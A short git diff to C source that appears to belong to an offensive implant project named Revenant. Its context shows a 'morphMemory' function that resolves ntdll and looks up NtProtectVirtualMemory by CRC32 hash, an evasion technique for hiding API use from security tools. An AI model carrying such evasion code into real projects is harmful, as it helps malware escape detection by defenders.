@@ -1,7 +1,7 @@
 //
 // Created by 0xtriboulet on 4/15/2023.
 //
-
+#include "Asm.h"
 #include "Config.h"
 #include "Poly.h"
 #include "Revenant.h"
@@ -123,11 +123,15 @@ VOID morphMemory(PBYTE pbyDst, BYTE byLength)
     DWORD dwOldProtect = 0x0;
 
 #if CONFIG_NATIVE == TRUE
-    #if CONFIG_ARCH == x64
+
+#if CONFIG_ARCH == 64
     void *p_ntdll = get_ntdll_64();
+
 #else
     void *p_ntdll = get_ntdll_32();
+
 #endif //CONFIG_ARCH
+
     NTSTATUS status;
     void *p_nt_protect_virtual_memory = GetProcAddressByHash(p_ntdll, NtProtectVirtualMemory_CRC32B);
     NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;
